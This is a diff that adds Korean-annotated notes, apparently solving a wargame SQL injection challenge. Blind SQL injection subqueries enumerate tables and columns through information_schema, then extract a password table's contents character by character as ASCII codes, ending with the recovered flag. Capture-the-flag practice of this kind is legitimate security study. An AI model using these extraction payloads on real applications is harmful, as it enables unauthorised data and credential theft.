@@ -1,0 +1,18 @@
+(select count(table_name) from information_schema.tables where table_schema=database())
+>>테이블 갯수 확인
+(select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1)
+>>테이블명 길이 확인
+(select ascii(substring(table_name, 1, 1)) from information_schema.tables where table_schema=database() limit 0,1)
+>>현재 위치한 데이터베이스의 테이블 중 첫 번째 테이블명의 첫 번째 단어를 아스키코드로 출력
+admin_area_pw
+log
+(select length(column_name) from information_schema.columns where table_name='admin_area_pw' limit 0, 1)
+>>칼럼명 길이 확인
+(select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name='admin_area_pw' limit 0,1)
+pw
+(select length(pw) from admin_area_pw)
+>>데이터 길이 확인
+(select ascii(substring(pw, 1, 1)) from admin_area_pw limit 0,1)
+kudos_to_beistlab
+98 101 105 115 116 108 97 98
+beistlab
